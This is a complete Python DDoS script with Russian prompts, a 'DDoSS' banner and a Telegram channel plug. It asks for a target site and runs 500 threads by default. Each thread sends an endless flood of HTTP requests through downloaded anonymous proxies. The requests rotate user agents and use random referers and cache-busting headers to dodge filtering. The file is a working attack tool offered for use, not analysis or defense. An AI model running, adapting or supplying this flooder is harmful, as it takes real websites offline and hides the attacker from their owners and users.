#!/usr/bin/python3

import requests, os, sys, random, re, threading
from bs4 import BeautifulSoup
from colorama import Fore

site = '' 
proxy = ''
headers_useragents, additionalHeaders = list (), list ()

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)
	
def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def initHeaders():
	useragent_list()
	global headers_useragents, additionalHeaders
	headers = {
				'User-Agent': random.choice(headers_useragents),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
				}
	if additionalHeaders:
		for header in additionalHeaders:
			headers.update({header.split(":")[0]:header.split(":")[1]})
	return headers

def clear (): 
	if os.name == 'nt': 
		_ = os.system('cls') 
	else: 
		_ = os.system('clear')

def get_proxy (url):
	a=requests.get(url)

	file=open("proxies.txt", 'w+')
	file.write(a.text)	
	file.close()


def send (site, proxy):
	proxies = open (proxy, 'r').read().splitlines()
	prox = {}
	for p in proxies:
		headers = initHeaders()
		prox['https'] = p
		try:
			while True:
				#print (site, headers, prox)
				requests.get (site, headers = headers, proxies = prox)
				print (Fore.GREEN + 'Запрос на ' + site + ' Выполнен')
		except:
			continue

def main ():
	print ('''
Наш телеграмчик: @Termuxtop
·▄▄▄▄  ▄• ▄▌·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
██▪ ██ █▪██▌██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
▐█· ▐█▌█▌▐█▌▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
██. ██ ▐█▄█▌██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
▀▀▀▀▀•  ▀▀▀ ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
	''')

	site = input ('Введите url сайта: ')
	thread = input ('Введите кол-во потоков (по умолчанию 500): ')
	proxy = input ('Введите файл с proxy (или будут использоваться стандартные): ')

	if thread.strip () == '':
		thread = 500

	if proxy.strip () == '':
		get_proxy ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&anonymity=elite&ssl=yes')
		proxy = 'proxies.txt'

	thread_list = []

	try:
		for i in range (int(thread)):
			t = threading.Thread (target = send, name = 'thread{}'.format (i), args = (site, proxy))
			thread_list.append (t)
			t.start()
	except:
		for t in thread_list:
			t.join ()
			print (Fore.RED + 'Все proxy заблокированы. DDoS остановлен...')

if __name__ == '__main__':
	clear ()
	main ()
